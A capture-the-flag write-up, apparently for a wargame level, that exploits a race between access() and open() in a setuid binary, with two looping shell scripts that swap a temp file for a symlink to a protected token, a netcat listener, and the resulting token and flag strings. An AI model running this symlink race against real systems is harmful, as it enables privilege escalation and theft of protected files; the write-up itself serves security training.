# LEVEL10

Using the command ```strings``` we can see there is a web server on the port 6969

We use the command ```nc -lk 6969``` and will be listening on the 6969 port. 

Using ```nm```, ```strings```, ```gdb``` we see that the program will first check permission on the file with **access** then **open** it if there is permission are ok.

So there is a race condition. There is a gap between the **access** and **open** this is when will try to switch the file to open.

This first script will create a file called **flag10** in ```/tmp``` then replacing it with a sym link to **token** named **flag10**. The goal here is to spam enough so when it check for **access** it is the file **flag10** with good permission and when it opens it, it's now the sym link to **token**

```
#!/bin/sh
while true
do
rm -rf /tmp/flag10
touch /tmp/flag10
rm -rf /tmp/flag10
ln -s ~/token /tmp/flag10
done
```

The second script is here to spam the execution of the binary file.

```
#!/bin/sh
while true
do
        ~/level10 /tmp/flag10 127.0.0.1
done
````

After some runs we will get the following token ```woupa2yuojeeaaed06riuj63c``` which allows us to connect to flag10 and ```getflag``` to obtain : ```feulo4b72j7edeahuete3no7c```
